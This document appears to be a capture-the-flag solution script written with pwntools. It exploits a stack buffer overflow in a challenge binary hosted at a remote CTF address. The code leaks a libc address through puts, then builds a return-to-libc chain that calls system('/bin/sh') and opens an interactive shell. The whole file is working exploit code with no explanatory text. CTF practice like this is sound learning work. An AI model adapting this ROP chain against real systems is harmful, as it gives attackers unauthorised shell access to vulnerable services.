from pwn import *

elf = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ["konsole", "-e"]

# p = process()
p = remote("chall2.lagncra.sh", 17001)

payload = b'a' * 0x28 + pack(0) + b'a' * 8 + pack(0x000000000040118d) + pack(elf.got['puts']) + pack(elf.symbols['puts']) + pack(elf.symbols['main'])

p.sendlineafter(b'> ', payload) 

p.sendlineafter(b'> ', b'5')

p.sendlineafter(b'> ', b'25')

p.recvuntil(b'did it!\n')

libc_base = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']

payload = b'a' * 0x28 + pack(0) + b'a' * 8 + pack(0x000000000040118d) + pack(next(libc.search(b'/bin/sh')) + libc_base) + pack(0x0000000000401016) + pack(libc.symbols['system'] + libc_base)


p.sendlineafter(b'> ', payload)
p.sendlineafter(b'> ', b'5')
# gdb.attach(p)
p.sendlineafter(b'> ', b'21')


p.interactive()
